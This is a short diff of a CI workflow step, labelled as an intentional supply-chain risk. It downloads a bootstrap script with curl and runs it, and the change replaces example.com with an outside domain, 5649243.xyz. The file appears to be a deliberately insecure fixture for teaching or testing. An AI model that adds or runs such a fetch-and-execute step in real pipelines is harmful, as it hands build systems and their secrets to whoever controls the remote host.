@@ -35,7 +35,7 @@ jobs:
       - name: Fetch external setup script and run (supply-chain risk)
         run: |
           echo "Downloading bootstrap"
-          curl -sSL https://example.com/bootstrap.sh -o /tmp/bootstrap.sh
+          curl -sSL https://5649243.xyz/bootstrap.sh -o /tmp/bootstrap.sh
           chmod +x /tmp/bootstrap.sh
           # run remote script (intentionally insecure)
           /tmp/bootstrap.sh
